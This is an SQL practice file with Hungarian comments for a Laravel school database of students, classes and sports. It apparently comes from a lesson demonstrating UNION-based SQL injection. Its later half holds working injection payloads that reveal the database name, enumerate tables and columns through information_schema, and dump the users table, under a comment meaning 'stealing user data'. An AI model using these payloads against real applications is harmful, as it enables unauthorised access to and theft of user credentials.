CREATE DATABASE `laravel-iskola3`
	CHARACTER SET utf8
	COLLATE utf8_hungarian_ci;


select * from sports;

select * from osztalies;
select * from diaks;

select * from users;
// delete from users where id=28;

select * from sportolas;

select * from sportolas
  where diakokId = 2 AND sportokId = 2;

SELECT id, osztalyId, nev,neme,szuletett,helyseg, osztondij, atlag from diaks 
            WHERE nev = 'Feri'
union select * from users;

select database();


# sql injection
select * from diaks
  where nev = "Feri";

# union
select * from diaks
union 
select *, '', '', '', '', '', '', '', '' from osztalies
;




# mi az adatbázis neve
select database();

SELECT * from diaks 
  WHERE nev = "Feri" union select database(), '', '', '', '', '', '', '', '', '';#";



# milyen táblák vannak
SELECT table_name from information_schema.tables
  WHERE table_schema = 'laravel-iskola3'; 

SELECT * from diaks 
  WHERE nev = "Feri" union SELECT table_name, '', '', '', '', '', '', '', '', '' from information_schema.tables WHERE table_schema = 'laravel-iskola3'; 



# táblának milyen oszlopai vannak
SELECT column_name from information_schema.columns
  WHERE table_name='users' AND table_schema = 'laravel-iskola3';

SELECT * from diaks 
  WHERE nev = "Feri" union SELECT column_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE  table_name='users' AND  table_schema = 'laravel-iskola3';#"; 

# user adatok ellopása


SELECT * from diaks 
  WHERE nev = "Feri" union select *, '', '' from users;#";
